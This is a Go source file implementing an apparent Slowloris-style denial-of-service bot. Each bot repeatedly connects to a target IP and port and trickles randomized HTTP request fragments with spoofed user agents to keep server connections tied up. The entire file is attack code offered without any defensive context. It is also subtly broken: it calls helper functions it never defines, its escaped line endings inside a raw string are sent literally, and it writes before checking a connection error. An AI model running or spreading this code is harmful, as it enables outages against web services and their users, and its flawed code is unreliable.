package main

import (
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

var header = `
GET /?{} HTTP/1.1\r\n
Connection: keep-alive\r\n
User-Agent: {}\r\n\r\n
`

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
	header = strings.ReplaceAll(header, "\n\n", "\n")
	header = strings.ReplaceAll(header, "\nGET", "GET")
}

type Bot struct {
	IP      string
	port    string
	isAlive bool
	wg      *sync.WaitGroup
	_       struct{}
}

func newBot(ip, port string, wg *sync.WaitGroup) *Bot {
	return &Bot{
		IP:      ip,
		port:    port,
		isAlive: true,
		wg:      wg,
	}
}

func (b *Bot) sleep() {
	for i := 0; i < randint(5, 10); i++ {
		if b.isAlive {
			time.Sleep(time.Second)
		}
	}
}

func (b *Bot) interact(conn *net.TCPConn) {

main:
	for {
		for i := 0; i < randint(5, 12); i++ {
			if b.isAlive {
				time.Sleep(time.Second)
			} else {
				break main
			}
		}

		_, err := conn.Write([]byte(constructHeader()))

		if err != nil || !b.isAlive {
			break main
		}
	}

}

func (b *Bot) contactTarget() {

	defer func() {
		if r := recover(); r != nil {
			b.sleep()
		}
	}()

	service := b.IP + ":" + b.port
	tcpAddr, _ := net.ResolveTCPAddr("tcp4", service)

	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	conn.Write([]byte(constructHeader()))

	if err == nil {
		b.interact(conn)
	} else {
		b.sleep()
	}
}

func (b *Bot) start() {
	for b.isAlive {
		b.contactTarget()
	}
}

func (b *Bot) stop() {
	b.isAlive = false
	b.wg.Done()
}

func constructHeader() (newHeader string) {
	newHeader = strings.Replace(header, "{}", getText(), 1)
	newHeader = strings.Replace(newHeader, "{}", getUseragent(), 1)
	return
}

func getText() (text string) {
	printables := fmt.Sprintf("%s%s", asciilowercase(), asciiuppercase())

	for i := 0; i < 10; i++ {
		printables += strconv.Itoa(i)
	}

	for i := 0; i < randint(3, 10); i++ {
		text += getRandItem(printables)
	}

	return
}

func randint(min, max int) int {
	return rand.Intn(max-min) + min
}

func getRandItem(items string) string {
	n := randint(0, len(items))
	return string(items[n])
}
